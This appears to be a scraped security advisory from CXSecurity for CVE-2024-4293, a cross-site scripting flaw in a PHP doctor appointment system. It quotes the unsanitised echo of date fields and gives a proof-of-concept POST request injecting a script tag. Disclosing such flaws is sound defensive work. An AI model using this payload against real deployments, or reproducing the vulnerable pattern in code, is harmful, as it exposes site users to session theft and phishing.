---
title: Doctor Appointment Management System 1.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2024050003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-02
fetch_date: 2025-10-06T17:14:46.309473
---

# Doctor Appointment Management System 1.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Doctor Appointment Management System 1.0 Cross Site Scripting** **2024.05.01**  Credit:  **[SoSPiro](https://cxsecurity.com/author/SoSPiro/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-4293](https://cxsecurity.com/cveshow/CVE-2024-4293/ "Click to see CVE-2024-4293")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Application Name: Doctor Appointment Management System
# Software Link: [Download Link](https://phpgurukul.com/doctor-appointment-management-system-using-php-and-mysql/)
# Vendor Homepage: [Vendor Homepage](https://phpgurukul.com/)
# BuG: XsS
# BUG\_Author: SoSPiro
# Version: 1.0
# CVE: CVE-2024-4293
### Vulnerable code section:
- `http://localhost/Doctor-Appointment-System\_PHP/dams/doctor/appointment-bwdates.php`
- \*\*`Lines 57-61`\*\*
- Parameter `$fdate=$\_POST['fromdate'];` and `$tdate=$\_POST['todate']`
```php
<?php
$fdate=$\_POST['fromdate'];
$tdate=$\_POST['todate'];
?>
<h5 align="center" style="color:blue">Report from <?php echo $fdate?> to <?php echo $tdate?></h5>
```
- The lack of proper validation and sanitization of user input allows for potential Cross-Site Scripting (XSS) attacks.
### Vulnerability Description:
- The Doctor Appointment Management System is susceptible to a Cross-Site Scripting (XSS) vulnerability. This vulnerability allows attackers to inject malicious scripts into web pages viewed by other users.
### Proof of Concept (PoC)
- Poc Video : [Video Link](https://drive.google.com/file/d/1X7OPM1\_Sb-xeIZO8ZdXekLtinUqzVdLx/view?usp=sharing)
- Poc Video2: [Video Link](https://drive.google.com/file/d/1V6TP9ecAGUbsLvupE\_7aQ8lkn\_h5Jm18/view?usp=sharing)
```http
POST /Doctor-Appointment-System\_PHP/dams/doctor/appointment-bwdates-reports-details.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://localhost
Connection: close
Referer: http://localhost/Doctor-Appointment-System\_PHP/dams/doctor/appointment-bwdates.php
Cookie: PHPSESSID=n8jjbs917jtj52rags5p7ll9ff
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: blue
fromdate=<script>alert(1)</script>&todate=2024-04-18&submit=
```
- In this POST request, an attacker has included a script tag in the "fromdate" and "todate" field:
`<script>alert(1)</script>`
- Upon successful exploitation, an alert box containing the text "1" will be displayed on the victim's browser, indicating that the XSS vulnerability has been successfully exploited.
### Impact:
- The impact of this vulnerability is significant. Attackers can exploit it to execute arbitrary JavaScript code within the context of the affected web page. This could lead to various malicious activities such as session hijacking, phishing attacks, or defacement of the website.
### Reproduce:
- [ -vuldb.com- ](https://vuldb.com/?id.262225)
- [ -cve.org- ](https://www.cve.org/CVERecord?id=CVE-2024-4293)
- [ -github- ](https://github.com/Sospiro014/zday1/blob/main/doctor\_appointment\_management\_system\_xss.md)
- [ -github2- ](https://github.com/Sospiro014/zday1/blob/main/doctor\_appointment\_management\_system\_xss2.md)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050003)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top